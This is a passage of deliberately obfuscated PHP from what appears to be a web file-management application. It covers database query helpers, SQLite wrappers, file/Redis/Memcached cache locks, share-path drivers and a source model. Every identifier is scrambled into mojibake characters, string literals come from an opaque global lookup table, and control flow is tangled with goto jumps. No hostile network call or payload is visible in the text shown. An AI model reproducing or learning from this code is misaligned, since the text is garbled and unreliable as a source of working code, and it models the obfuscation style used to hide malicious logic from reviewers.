\137\x73\143\150\x65\x6d\x61\12\11\x9\x41\116\x44\40\164\x2e\x74\141\x62\x6c\145\137\x6e\141\x6d\145\40\75\40\x63\56\x74\x61\142\x6c\145\137\156\141\x6d\x65\xa\x9\x9\x57\x48\x45\x52\105\40\40\40\164\x2e\164\141\x62\x6c\145\137\x6e\x61\x6d\145\40\75\x20\47{$Fíï¹ËéŸ³}\x27"; break; case $d¸Ç Ê£’[863]: $c÷ÄñÍÒ÷ = $d¸Ç Ê£’[864] . $Fíï¹ËéŸ³ . $d¸Ç Ê£’[865]; break; case $d¸Ç Ê£’[845]: case $d¸Ç Ê£’[847]: $c÷ÄñÍÒ÷ = $d¸Ç Ê£’[866] . $d¸Ç Ê£’[867] . $d¸Ç Ê£’[868] . strtoupper($Fíï¹ËéŸ³) . $d¸Ç Ê£’[869] . strtoupper($Fíï¹ËéŸ³) . $d¸Ç Ê£’[870]; break; case $d¸Ç Ê£’[871]: $c÷ÄñÍÒ÷ = $d¸Ç Ê£’[872] . $Fíï¹ËéŸ³ . $d¸Ç Ê£’[873]; break; case $d¸Ç Ê£’[846]: break; case $d¸Ç Ê£’[874]: default: $c÷ÄñÍÒ÷ = $d¸Ç Ê£’[875] . ($this->dbType == $d¸Ç Ê£’[874] ? "\140{$Fíï¹ËéŸ³}\140" : $Fíï¹ËéŸ³); } } goto A£±ÄˆæĞá; A£±ÄˆæĞá: $bçÊÂÛßë† = $this->query($c÷ÄñÍÒ÷); $B‡Í¼“½âŒ = array(); if ($bçÊÂÛßë†) { foreach ($bçÊÂÛßë† as $cÌŞÓÓÓ†¸ => $FêœÊ”·Õ) { $FêœÊ”·Õ = array_change_key_case($FêœÊ”·Õ); $FêœÊ”·Õ[$d¸Ç Ê£’[28]] = isset($FêœÊ”·Õ[$d¸Ç Ê£’[28]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[28]] : $d¸Ç Ê£’[377]; $FêœÊ”·Õ[$d¸Ç Ê£’[29]] = isset($FêœÊ”·Õ[$d¸Ç Ê£’[29]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[29]] : $d¸Ç Ê£’[377]; $eˆ§Ñããà = isset($FêœÊ”·Õ[$d¸Ç Ê£’[276]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[276]] : $FêœÊ”·Õ[$d¸Ç Ê£’[28]]; $B‡Í¼“½âŒ[$eˆ§Ñããà] = array($d¸Ç Ê£’[28] => $eˆ§Ñããà, $d¸Ç Ê£’[29] => $FêœÊ”·Õ[$d¸Ç Ê£’[29]], $d¸Ç Ê£’[31] => (bool) (isset($FêœÊ”·Õ[$d¸Ç Ê£’[109]]) && $FêœÊ”·Õ[$d¸Ç Ê£’[109]] === $d¸Ç Ê£’[33] || isset($FêœÊ”·Õ[$d¸Ç Ê£’[31]]) && $FêœÊ”·Õ[$d¸Ç Ê£’[31]] === $d¸Ç Ê£’[33]), $d¸Ç Ê£’[34] => isset($FêœÊ”·Õ[$d¸Ç Ê£’[34]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[34]] : (isset($FêœÊ”·Õ[$d¸Ç Ê£’[63]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[63]] : $d¸Ç Ê£’[377]), $d¸Ç Ê£’[36] => isset($FêœÊ”·Õ[$d¸Ç Ê£’[99]]) ? strtolower($FêœÊ”·Õ[$d¸Ç Ê£’[99]]) == $d¸Ç Ê£’[38] : (isset($FêœÊ”·Õ[$d¸Ç Ê£’[64]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[64]] : !1), $d¸Ç Ê£’[39] => isset($FêœÊ”·Õ[$d¸Ç Ê£’[876]]) ? strtolower($FêœÊ”·Õ[$d¸Ç Ê£’[876]]) == $d¸Ç Ê£’[41] : (isset($FêœÊ”·Õ[$d¸Ç Ê£’[99]]) ? $FêœÊ”·Õ[$d¸Ç Ê£’[99]] : !1)); } } goto A§ë‚Íá; DºòØ–á¯œ: } public function getTables($cîê†œƒŒ¿ = '') { $báÕ»íêÁ¶ =& $_SERVER[¢Í]; if (think_config($báÕ»íêÁ¶[877])) { $DéµÌ¬Æ› = str_replace($báÕ»íêÁ¶[878], $cîê†œƒŒ¿, think_config($báÕ»íêÁ¶[877])); } else { switch ($this->dbType) { case $báÕ»íêÁ¶[845]: case $báÕ»íêÁ¶[847]: $DéµÌ¬Æ› = $báÕ»íêÁ¶[879]; break; case $báÕ»íêÁ¶[844]: case $báÕ»íêÁ¶[862]: $DéµÌ¬Æ› = $báÕ»íêÁ¶[880]; break; case $báÕ»íêÁ¶[871]: $DéµÌ¬Æ› = $báÕ»íêÁ¶[881]; break; case $báÕ»íêÁ¶[846]: think_exception(think_lang($báÕ»íêÁ¶[882]) . $báÕ»íêÁ¶[883]); break; case $báÕ»íêÁ¶[863]: $DéµÌ¬Æ› = $báÕ»íêÁ¶[42] . $báÕ»íêÁ¶[43] . $báÕ»íêÁ¶[44]; break; case $báÕ»íêÁ¶[874]: default: if (!empty($cîê†œƒŒ¿)) { $DéµÌ¬Æ› = $báÕ»íêÁ¶[827] . $cîê†œƒŒ¿ . $báÕ»íêÁ¶[828]; } else { $DéµÌ¬Æ› = $báÕ»íêÁ¶[829]; } } } $CØã…•¯  = $this->query($DéµÌ¬Æ›); $B³¬›”Ò‡ = array(); foreach ($CØã…•¯  as $b¨É“ÍŠÊš => $fÙ¥œï¶) { $B³¬›”Ò‡[$b¨É“ÍŠÊš] = current($fÙ¥œï¶); } return $B³¬›”Ò‡; } protected function parseLimit($eòĞ¶ğ) { $DŒ“©¿‡ò‚ =& $_SERVER[¢Í]; $fõŸ«°‰ò = $DŒ“©¿‡ò‚[33]; if (!empty($eòĞ¶ğ)) { switch ($this->dbType) { case $DŒ“©¿‡ò‚[871]: case $DŒ“©¿‡ò‚[863]: $eòĞ¶ğ = explode($DŒ“©¿‡ò‚[47], $eòĞ¶ğ); if (count($eòĞ¶ğ) > 1) { $fõŸ«°‰ò .= $DŒ“©¿‡ò‚[48] . $eòĞ¶ğ[1] . $DŒ“©¿‡ò‚[49] . $eòĞ¶ğ[0] . $DŒ“©¿‡ò‚[50]; } else { $fõŸ«°‰ò .= $DŒ“©¿‡ò‚[48] . $eòĞ¶ğ[0] . $DŒ“©¿‡ò‚[50]; } break; case $DŒ“©¿‡ò‚[844]: case $DŒ“©¿‡ò‚[862]: break; case $DŒ“©¿‡ò‚[846]: break; case $DŒ“©¿‡ò‚[845]: case $DŒ“©¿‡ò‚[847]: break; case $DŒ“©¿‡ò‚[874]: default: $fõŸ«°‰ò .= $DŒ“©¿‡ò‚[48] . $eòĞ¶ğ . $DŒ“©¿‡ò‚[50]; } } return $fõŸ«°‰ò; } public function parseKey(&$BòÆÍøÁç‡, $A÷è±ÚÕ = true) { $EÁä”¡½©’ =& $_SERVER[¢Í]; if ($A÷è±ÚÕ) { $BòÆÍøÁç‡ = $this->parseKeyCheck($BòÆÍøÁç‡); } if ($this->dbType == $EÁä”¡½©’[874]) { if ($BòÆÍøÁç‡ != $EÁä”¡½©’[190] && !preg_match($EÁä”¡½©’[839], $BòÆÍøÁç‡)) { $BòÆÍøÁç‡ = $EÁä”¡½©’[384] . trim($BòÆÍøÁç‡, $EÁä”¡½©’[384]) . $EÁä”¡½©’[384]; } return $BòÆÍøÁç‡; } else { return parent::parseKey($BòÆÍøÁç‡); } } public function close() { $this->_linkID = null; } public function error() { $aˆóù¾™Ñ  =& $_SERVER[¢Í]; if ($this->PDOStatement) { $fÛ§ßË¢ ¤ = $this->PDOStatement->errorInfo(); $this->error = $fÛ§ßË¢ ¤[1] . $aˆóù¾™Ñ [4] . $fÛ§ßË¢ ¤[2]; } else { $this->error = $aˆóù¾™Ñ [33]; } if ($aˆóù¾™Ñ [33] != $this->queryStr) { $this->error .= LNG($aˆóù¾™Ñ [45]) . $this->queryStr; } think_trace($this->error, $aˆóù¾™Ñ [33], $aˆóù¾™Ñ [46]); return $this->error; } public function escapeString($eğ Æ¸×) { $AÖÙ‹®µ–® =& $_SERVER[¢Í]; switch ($this->dbType) { case $AÖÙ‹®µ–®[871]: case $AÖÙ‹®µ–®[844]: case $AÖÙ‹®µ–®[862]: case $AÖÙ‹®µ–®[874]: return addslashes($eğ Æ¸×); case $AÖÙ‹®µ–®[846]: case $AÖÙ‹®µ–®[863]: case $AÖÙ‹®µ–®[845]: case $AÖÙ‹®µ–®[847]: return str_ireplace($AÖÙ‹®µ–®[65], $AÖÙ‹®µ–®[66], $eğ Æ¸×); } } protected function parseValue($bÂÈ„œŒà) { $DáØöÆğóì =& $_SERVER[¢Í]; if (is_string($bÂÈ„œŒà)) { $bÂÈ„œŒà = strpos($bÂÈ„œŒà, $DáØöÆğóì[4]) === 0 ? $this->escapeString($bÂÈ„œŒà) : $DáØöÆğóì[884] . $this->escapeString($bÂÈ„œŒà) . $DáØöÆğóì[884]; } elseif (isset($bÂÈ„œŒà[0]) && is_string($bÂÈ„œŒà[0]) && strtolower($bÂÈ„œŒà[0]) == $DáØöÆğóì[300]) { $bÂÈ„œŒà = $this->escapeString($bÂÈ„œŒà[1]); } elseif (is_array($bÂÈ„œŒà)) { $bÂÈ„œŒà = array_map(array($this, $DáØöÆğóì[885]), $bÂÈ„œŒà); } elseif (is_bool($bÂÈ„œŒà)) { $bÂÈ„œŒà = $bÂÈ„œŒà ? $DáØöÆğóì[93] : $DáØöÆğóì[494]; } elseif (is_null($bÂÈ„œŒà)) { $bÂÈ„œŒà = $DáØöÆğóì[109]; } return $bÂÈ„œŒà; } public function getLastInsertId() { $F¼‹¯İÔ² =& $_SERVER[¢Í]; switch ($this->dbType) { case $F¼‹¯İÔ²[871]: case $F¼‹¯İÔ²[863]: case $F¼‹¯İÔ²[844]: case $F¼‹¯İÔ²[862]: case $F¼‹¯İÔ²[846]: case $F¼‹¯İÔ²[874]: return $this->_linkID->lastInsertId(); case $F¼‹¯İÔ²[845]: case $F¼‹¯İÔ²[847]: $A‹‡ºÌİƒ = $this->table; $DíĞÊó‡çÉ = $this->query("\123\105\x4c\x45\103\x54\40{$A‹‡ºÌİƒ}\x2e\x63\165\x72\162\x76\x61\x6c\40\143\165\x72\162\x76\141\154\40\106\x52\117\115\40\x64\165\x61\x6c"); return $DíĞÊó‡çÉ ? $DíĞÊó‡çÉ[0][$F¼‹¯İÔ²[886]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($f•„‘ê—»…) { $EßòƒË¯á =& $_SERVER[¢Í]; if (!CacheLock::fileLock($EßòƒË¯á[9])) { return !1; } $dÅî†ëæğğ = parent::query($f•„‘ê—»…); CacheLock::fileUnLock($EßòƒË¯á[9]); return $dÅî†ëæğğ; } public function execute($aèù¶¸½š·) { $Cçè†„³æÇ =& $_SERVER[¢Í]; if (!CacheLock::fileLock($Cçè†„³æÇ[9])) { return !1; } $b»ğï™ÂîŞ = parent::execute($aèù¶¸½š·); CacheLock::fileUnLock($Cçè†„³æÇ[9]); return $b»ğï™ÂîŞ; } } class DbSqlite3 extends DbSqlite3Base { public function query($d¸œ¦÷†¿÷) { $EÁÁƒÛî¹ =& $_SERVER[¢Í]; if (!CacheLock::fileLock($EÁÁƒÛî¹[9])) { return !1; } $f×ª›£Ï£ñ = parent::query($d¸œ¦÷†¿÷); CacheLock::fileUnLock($EÁÁƒÛî¹[9]); return $f×ª›£Ï£ñ; } public function execute($cŒí…—æÊñ) { $bƒğ²«¿Ğ— =& $_SERVER[¢Í]; if (!CacheLock::fileLock($bƒğ²«¿Ğ—[9])) { return !1; } $fƒãğ•£î = parent::execute($cŒí…—æÊñ); CacheLock::fileUnLock($bƒğ²«¿Ğ—[9]); return $fƒãğ•£î; } } goto CÛõ¥Äñš; Dâàâ¼›Ì: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eÁ±é•òô— =& $_SERVER[¢Í]; $D »‘¨¿²™ = $GLOBALS[$eÁ±é•òô—[6]][$eÁ±é•òô—[352]]; self::$cachePath = $D »‘¨¿²™[$eÁ±é•òô—[181]][$eÁ±é•òô—[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dõ˜Öø‰•, $f÷“Ç„ é = 0) { goto D›Ïµ¥ ; D›Ïµ¥ : $FˆÑ°¾¦ê =& $_SERVER[¢Í]; $DËÖÈö…‘´ = microtime(!0); $dĞëƒ¨Ô = $DËÖÈö…‘´ + $f÷“Ç„ é + 0.0001; goto eÂè±ïßÈ¥; fŒÒÄÍÇ: $this->unlock($dõ˜Öø‰•); return !1; goto AœÎ£ôƒÄ²; eÂè±ïßÈ¥: $FøŒÃ¡óï… = rtrim(self::$cachePath, $FˆÑ°¾¦ê[8]) . $FˆÑ°¾¦ê[793] . md5($dõ˜Öø‰•) . $FˆÑ°¾¦ê[790]; if (file_exists($FøŒÃ¡óï…) && filemtime($FøŒÃ¡óï…) && filemtime($FøŒÃ¡óï…) < time() - 10) { @unlink($FøŒÃ¡óï…); } do { if (file_exists($FøŒÃ¡óï…)) { cacheLockWait(); continue; } $BŒ¹Äë£¡‚ = fopen($FøŒÃ¡óï…, $FˆÑ°¾¦ê[794]); if (!$BŒ¹Äë£¡‚) { return !1; } $a¿ß’¨ó¦â = flock($BŒ¹Äë£¡‚, LOCK_EX | LOCK_NB); self::$caches[$dõ˜Öø‰•] = array($FˆÑ°¾¦ê[795] => $BŒ¹Äë£¡‚, $FˆÑ°¾¦ê[181] => $FøŒÃ¡óï…); fwrite($BŒ¹Äë£¡‚, $dĞëƒ¨Ô); clearstatcache(); if ($BŒ¹Äë£¡‚ && $a¿ß’¨ó¦â) { return !0; } cacheLockWait(); } while (microtime(!0) < $dĞëƒ¨Ô); goto fŒÒÄÍÇ; AœÎ£ôƒÄ²: } public function lockGet($b½È’Õ¼ÍŠ) { $eù¡‰ù¾Ü— =& $_SERVER[¢Í]; $B¥ÙÃ‡°õí = rtrim(self::$cachePath, $eù¡‰ù¾Ü—[8]) . $eù¡‰ù¾Ü—[793] . md5($b½È’Õ¼ÍŠ) . $eù¡‰ù¾Ü—[790]; return file_exists($B¥ÙÃ‡°õí); } public function unlock($AŒ×ë¾´·İ) { goto EŠŒ™¨ÍÓ£; bËÌÌñ·º: unset(self::$caches[$AŒ×ë¾´·İ]); goto A•æõ£»‚Î; EŠŒ™¨ÍÓ£: $c¨¤…áËÕ =& $_SERVER[¢Í]; $EæÂØ’¯œ = self::$caches[$AŒ×ë¾´·İ]; if (!$EæÂØ’¯œ) { return; } goto DÌÙ“Íœ‚; DÌÙ“Íœ‚: @flock($EæÂØ’¯œ[$c¨¤…áËÕ[795]], LOCK_UN); @fclose($EæÂØ’¯œ[$c¨¤…áËÕ[795]]); @unlink($EæÂØ’¯œ[$c¨¤…áËÕ[181]]); goto bËÌÌñ·º; A•æõ£»‚Î: } } class CacheLockRedis { public function lock($FÖ‰§¤†è, $dÖÖ¤ªÖ„ = 10) { $F¨¬™õÅö• = Cache::init(); $EÈö§áÄÍ = microtime(!0) + $dÖÖ¤ªÖ„; while (microtime(!0) < $EÈö§áÄÍ) { $CŒÚ…‡±ù¤ = $F¨¬™õÅö•->get($FÖ‰§¤†è); if (!$CŒÚ…‡±ù¤) { $añÖäŸÑ¬ = $F¨¬™õÅö•->setLock($FÖ‰§¤†è, $EÈö§áÄÍ, $dÖÖ¤ªÖ„); if ($añÖäŸÑ¬) { return !0; } } else { if ($CŒÚ…‡±ù¤ < microtime(!0)) { $F¨¬™õÅö•->set($FÖ‰§¤†è, $EÈö§áÄÍ, $EÈö§áÄÍ); if ($F¨¬™õÅö•->get($FÖ‰§¤†è) === $CŒÚ…‡±ù¤) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($a¼¾ÉëÑŞ) { return Cache::init()->get($a¼¾ÉëÑŞ); } public function unlock($bäÅ¶ÜŒ›) { return Cache::init()->remove($bäÅ¶ÜŒ›); } } class CacheLockMemcached { public function lock($e–ºÂ„Úš—, $C¼š¿¿¬‹¹ = 0) { $Aå“àãİ³ = Cache::init(); $B¨ç¸èÎ¸ = microtime(!0) + $C¼š¿¿¬‹¹; while (microtime(!0) < $B¨ç¸èÎ¸) { $eäÌ£Êœ‘Š = $Aå“àãİ³->get($e–ºÂ„Úš—); if (!$eäÌ£Êœ‘Š || $eäÌ£Êœ‘Š < microtime(!0)) { $EØçÂÑèù = $Aå“àãİ³->handle->add($e–ºÂ„Úš—, $B¨ç¸èÎ¸, $C¼š¿¿¬‹¹); if ($EØçÂÑèù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a•‘ç†¾–) { return Cache::init()->get($a•‘ç†¾–); } public function unlock($f¸¬œˆà§Î) { return Cache::init()->remove($f¸¬œˆà§Î); } } goto e½ÁÍ­à“; c÷âÍÓÁÊ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Cï‡—¦¡•) { $this->pathParse = $Cï‡—¦¡•; $this->model = Model($_SERVER[¢Í][1169]); } public function getPathOuter($EÄ¹İÌğù) { $F»©°±æ×Ô =& $_SERVER[¢Í]; if (!$EÄ¹İÌğù) { return $EÄ¹İÌğù; } $E­›ÓØÙ‘ = $this->parse($EÄ¹İÌğù); return trim(KodIO::makeShare($this->pathParse[$F»©°±æ×Ô[392]], $E­›ÓØÙ‘[$F»©°±æ×Ô[392]]), $F»©°±æ×Ô[8]); } protected function infoParse($b‰Éì›¸ôÅ, $F·ìˆ é„ = false, $e´Á±Âì”Š = false) { $F¾ˆ¥•ÀŠá =& $_SERVER[¢Í]; $aé¼ƒ¤Åª = $this->pathParse[$F¾ˆ¥•ÀŠá[392]]; $b§˜œòšÍ’ = trim($this->pathParse[$F¾ˆ¥•ÀŠá[1031]], $F¾ˆ¥•ÀŠá[8]); return Action($F¾ˆ¥•ÀŠá[1176])->sharePathInfo($aé¼ƒ¤Åª, $b§˜œòšÍ’); } public function infoFull($AÑ“Ø ÜÈ¿) { $c¾ÎÔ–Şœ† =& $_SERVER[¢Í]; $FÆ¹ùÈåÍ’ = explode($c¾ÎÔ–Şœ†[8], trim($AÑ“Ø ÜÈ¿, $c¾ÎÔ–Şœ†[8])); if (count($FÆ¹ùÈåÍ’) > 1) { $b¯ÑÍ¬¼¾ = implode($c¾ÎÔ–Şœ†[8], array_splice($FÆ¹ùÈåÍ’, 1)); $B³Ì¾êø† = $this->model->pathInfoByPath($FÆ¹ùÈåÍ’[0], $b¯ÑÍ¬¼¾); if (!$B³Ì¾êø†) { return !1; } $this->pathParse[$c¾ÎÔ–Şœ†[1031]] = $B³Ì¾êø†[$c¾ÎÔ–Şœ†[394]]; } return $this->infoParse($AÑ“Ø ÜÈ¿); } public function listAll($B¥£åÇ¢Íİ) { goto a¼» Æ‹ËŸ; a¼» Æ‹ËŸ: $b¶¿„ò¦Á =& $_SERVER[¢Í]; $bÉ·ìõ¶¼ = IO::info($this->pathParse[$b¶¿„ò¦Á[85]]); if (!$bÉ·ìõ¶¼) { return array(); } goto F·›£˜ƒšÖ; F·›£˜ƒšÖ: $F‹—á¹×À’ = $this->model->listAll($B¥£åÇ¢Íİ); $fò§¢ÙÚ = Model($b¶¿„ò¦Á[561])->getInfo($bÉ·ìõ¶¼[$b¶¿„ò¦Á[465]]); $aÚšŠ¹ô°„ = Action($b¶¿„ò¦Á[1176]); goto Cßì¯Ï’; Cßì¯Ï’: foreach ($F‹—á¹×À’ as &$aö‰‰«À©) { check_abort(); $aö‰‰«À©[$b¶¿„ò¦Á[416]] = $aÚšŠ¹ô°„->_shareItemeParse($aö‰‰«À©[$b¶¿„ò¦Á[416]], $fò§¢ÙÚ); } unset($aö‰‰«À©); return $F‹—á¹×À’; goto Dã¨˜©êÙ; Dã¨˜©êÙ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($F‡¹²Ú„‹ã) { $this->pathParse = $F‡¹²Ú„‹ã; $this->model = Model($_SERVER[¢Í][1169]); } protected function infoParse($CíœëÇğÌ¨, $eÃ«¨ŸÙ½ñ = false, $f¬õÕ™È = false) { $cÙ ì¼Áï =& $_SERVER[¢Í]; return Action($cÙ ì¼Áï[1037])->sharePathInfo($this->pathParse[$cÙ ì¼Áï[85]], !0); } public function listPath($e×ºïÉóÍº, $E¸§âŠ˜Ç = false) { $bÉêèš­È =& $_SERVER[¢Í]; $F­ºƒ¡ğ•Ë = parent::listPath($e×ºïÉóÍº, $E¸§âŠ˜Ç); foreach ($F­ºƒ¡ğ•Ë as $E˜÷…¨´‚§ => $EÍ¾ÌŠ¡‹„) { if (!in_array($E˜÷…¨´‚§, array($bÉêèš­È[83], $bÉêèš­È[84]))) { continue; } foreach ($EÍ¾ÌŠ¡‹„ as $Få³§±ÍÁ¬ => $DÙåÇÀ“ç¾) { $F­ºƒ¡ğ•Ë[$E˜÷…¨´‚§][$Få³§±ÍÁ¬] = Action($bÉêèš­È[1037])->shareItemInfo($DÙåÇÀ“ç¾); } } return $F­ºƒ¡ğ•Ë; } public function listAll($dŸ–˜ì’È•) { goto b«£¼…ãÊ×; Eí­¯Ùìèè: return $FÛù¡ò½İ›; goto C‚›èåôÊ; b«£¼…ãÊ×: $e‹ÎŞ‹êÀ =& $_SERVER[¢Í]; $Eé„øé¶ÁÆ = IO::info($this->pathParse[$e‹ÎŞ‹êÀ[85]]); if (!$Eé„øé¶ÁÆ) { return array(); } goto C‚¶æ˜Ï³; C‚¶æ˜Ï³: $FÛù¡ò½İ› = $this->model->listAll($dŸ–˜ì’È•); foreach ($FÛù¡ò½İ› as &$fŒ·†Úš‚) { $fŒ·†Úš‚[$e‹ÎŞ‹êÀ[416]] = Action($e‹ÎŞ‹êÀ[1037])->shareItemInfo($fŒ·†Úš‚[$e‹ÎŞ‹êÀ[416]]); } unset($fŒ·†Úš‚); goto Eí­¯Ùìèè; C‚›èåôÊ: } } class PathDriverDriverShareItem { public function __construct($a×Ğ‰Œ×—Ç) { $this->pathParse = $a×Ğ‰Œ×—Ç; } public function __call($A§¿È¶ªó¸, $c‡ùØó£ëĞ) { $D’˜ç†¨Ù— =& $_SERVER[¢Í]; if (method_exists($this, $A§¿È¶ªó¸)) { return; } $d¡ç™¦Š¼© = call_user_func_array(array($D’˜ç†¨Ù—[1177], $A§¿È¶ªó¸), $c‡ùØó£ëĞ); $A¶«Æº¬¤… = array($D’˜ç†¨Ù—[1178], $D’˜ç†¨Ù—[1179], $D’˜ç†¨Ù—[1180], $D’˜ç†¨Ù—[1181], $D’˜ç†¨Ù—[516], $D’˜ç†¨Ù—[518], $D’˜ç†¨Ù—[1182], $D’˜ç†¨Ù—[113], $D’˜ç†¨Ù—[1183], $D’˜ç†¨Ù—[1184]); if (in_array($A§¿È¶ªó¸, $A¶«Æº¬¤…)) { $d¡ç™¦Š¼© = $this->getPathOuter($d¡ç™¦Š¼©); } return $d¡ç™¦Š¼©; } public function copy($B†Áº„Ã‘ˆ, $cÒˆîÇ©èá, $d‚ß—ÒÑâ¬ = false) { return $this->copyMove($B†Áº„Ã‘ˆ, $cÒˆîÇ©èá, $d‚ß—ÒÑâ¬, $_SERVER[¢Í][516]); } public function move($b¾—Ú¾¢²ï, $C…½Ï†¬æ£, $cßŸ³š¼‡— = false) { return $this->copyMove($b¾—Ú¾¢²ï, $C…½Ï†¬æ£, $cßŸ³š¼‡—, $_SERVER[¢Í][518]); } private function copyMove($C–óÂ¡–, $F¥›òä“¡, $EšÃŞÒŞ‘‰, $Dó·Œ¿Íæ) { goto Aùã·Şš®ï; a“å–°¸šÃ: return $FÜ§ÈŒÎÚ; goto E‘Ë¼Çˆ”; BñçŸŞÆ‰õ: if ($bŠ„Ó¤°¨Ê->pathParse[$F¥œÊœ¥è‰[1015]]) { $F¥›òä“¡ = $bŠ„Ó¤°¨Ê->pathParse[$F¥œÊœ¥è‰[1015]]; } else { $F¥›òä“¡ = $DÅÜÚ’ñè•; } $FÜ§ÈŒÎÚ = IO::copyMove($C–óÂ¡–, $F¥›òä“¡, $EšÃŞÒŞ‘‰, $Dó·Œ¿Íæ); $FÜ§ÈŒÎÚ = $this->getPathOuter($FÜ§ÈŒÎÚ); goto a“å–°¸šÃ; Aùã·Şš®ï: $F¥œÊœ¥è‰ =& $_SERVER[¢Í]; $DÅÜÚ’ñè• = $F¥›òä“¡; $bŠ„Ó¤°¨Ê = IO::driverMake($F¥›òä“¡); goto BñçŸŞÆ‰õ; E‘Ë¼Çˆ”: } public function pathThis($BèäÅ´ë»ƒ) { return get_path_this($this->pathParse[$_SERVER[¢Í][85]]); } public function pathFather($E²ƒƒ©–— ) { return get_path_father($this->pathParse[$_SERVER[¢Í][85]]); } public function iconvSystem($b“èÒ¹˜º) { return $b“èÒ¹˜º; } protected function infoParse($Dƒõùæ´·ë, $Bªë´‚ÙË· = false) { $e¾º¾ÊóÕø =& $_SERVER[¢Í]; $E÷‹é—‘«Ó = $this->pathParse[$e¾º¾ÊóÕø[463]][$e¾º¾ÊóÕø[1038]] . $this->pathParse[$e¾º¾ÊóÕø[1031]]; if ($Bªë´‚ÙË·) { $CÈã‹³šò = IO::infoWithChildren($E÷‹é—‘«Ó); } else { $CÈã‹³šò = IO::info($E÷‹é—‘«Ó); } $cºô×˜ôÈ° = $this->pathParse[$e¾º¾ÊóÕø[463]]; return Action($e¾º¾ÊóÕø[1176])->_shareItemeParse($CÈã‹³šò, $cºô×˜ôÈ°); } public function listAll($Bø‚‚ƒ¼¡ê) { $Aë ± ˆ×“ =& $_SERVER[¢Í]; $FÃ»›‚Œ¶ƒ = IO::listAll($Bø‚‚ƒ¼¡ê); $aİæ£ñ–¢ = $this->pathParse[$Aë ± ˆ×“[463]]; foreach ($FÃ»›‚Œ¶ƒ as &$dÃ÷ñìÈí) { check_abort(); $dÃ÷ñìÈí = array_merge(IO::info($dÃ÷ñìÈí[$Aë ± ˆ×“[85]]), $dÃ÷ñìÈí); $dÃ÷ñìÈí[$Aë ± ˆ×“[416]] = Action($Aë ± ˆ×“[1176])->_shareItemeParse($dÃ÷ñìÈí, $aİæ£ñ–¢); } unset($dÃ÷ñìÈí); return $FÃ»›‚Œ¶ƒ; } public function getPathOuter($Fô¦…ŠÚƒÃ) { goto E½ö¶íŸ; E½ö¶íŸ: $CĞ¬»‘ôÌ =& $_SERVER[¢Í]; $A†Öµ¢ù• = KodIO::parse($Fô¦…ŠÚƒÃ); if ($A†Öµ¢ù•[$CĞ¬»‘ôÌ[29]] == KodIO::KOD_SHARE_ITEM) { return $A†Öµ¢ù•[$CĞ¬»‘ôÌ[85]]; } goto FÓğÚÕŒÜŠ; Bùšİ…®À´: if (substr($A—ôôºèÊÔ, 0, strlen($bºóŒÇÂù)) != $bºóŒÇÂù) { return !1; } return $this->pathParse[$CĞ¬»‘ôÌ[1032]] . $CĞ¬»‘ôÌ[8] . ltrim($dã´¿Úñöç, $CĞ¬»‘ôÌ[8]); goto c³Æù‘ğØ; FÓğÚÕŒÜŠ: $A—ôôºèÊÔ = KodIO::clear($Fô¦…ŠÚƒÃ); $bºóŒÇÂù = KodIO::clear($this->pathParse[$CĞ¬»‘ôÌ[463]][$CĞ¬»‘ôÌ[1038]]); $dã´¿Úñöç = substr($A—ôôºèÊÔ, strlen($bºóŒÇÂù)); goto Bùšİ…®À´; c³Æù‘ğØ: } public function getType() { $e®ƒõÈîË• =& $_SERVER[¢Í]; $f“ÛŠİ©Ô¯ = str_replace($e®ƒõÈîË•[81], $e®ƒõÈîË•[33], get_class($this)); return strtolower($f“ÛŠİ©Ô¯); } public function isTypeObject($b„Ãƒõ‡É½) { return IO::isTypeObject($b„Ãƒõ‡É½); } public function info($C¸¡˜ÌµÀî) { return $this->infoParse($C¸¡˜ÌµÀî); } public function infoAuth($C¸Õ¸°ªë) { return $this->infoParse($C¸Õ¸°ªë); } public function infoWithChildren($EÒŒ±š¨ÊÀ) { return $this->infoParse($EÒŒ±š¨ÊÀ, !0); } public function infoFull($e¨Ù»Í¿õ) { return $this->infoParse($e¨Ù»Í¿õ); } } goto eì¨ôµ®‡; AÒ¯ÒÖ÷: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ašïµà–¼) { $A…ƒÅ¯ÖÏ‚ =& $_SERVER[¢Í]; $Cİ‹ŞÅ‰˜î = Model($A…ƒÅ¯ÖÏ‚[500])->where(array($A…ƒÅ¯ÖÏ‚[1481] => $Ašïµà–¼))->find(); $Bê÷Î×ò = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ašïµà–¼, $Cİ‹ŞÅ‰˜î[$A…ƒÅ¯ÖÏ‚[28]]); $this->userDesktopAdd($Bê÷Î×ò); return $Bê÷Î×ò; } public function userDesktopAdd($cÇ††“í÷) { $B‡©‰¥Üœ« =& $_SERVER[¢Í]; $C„Ö†èÔÃÁ = LNG($B‡©‰¥Üœ«[1908]); $AŸÍÒ°îèç = $this->mkdir($cÇ††“í÷, $C„Ö†èÔÃÁ); $this->metaSet($AŸÍÒ°îèç, $B‡©‰¥Üœ«[1909], $B‡©‰¥Üœ«[93]); $this->metaSet($cÇ††“í÷, $B‡©‰¥Üœ«[1910], $AŸÍÒ°îèç); } public function groupRootAdd($c¥½Æ»Ø¬ç) { $fÊÌ¬º =& $_SERVER[¢Í]; $Bİßã¤«÷¡ = Model($fÊÌ¬º[484])->where(array($fÊÌ¬º[1729] => $c¥½Æ»Ø¬ç))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $c¥½Æ»Ø¬ç, $Bİßã¤«÷¡[$fÊÌ¬º[28]]); } public function systemRootPathAdd($B§òİ£­•Ğ) { if ($B§òİ£­•Ğ != $_SERVER[¢Í][1141]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B§òİ£­•Ğ); } public function userRootRemove($d‡Ñ‚”ÕŸ) { $cÛ×†ÎØÔ = 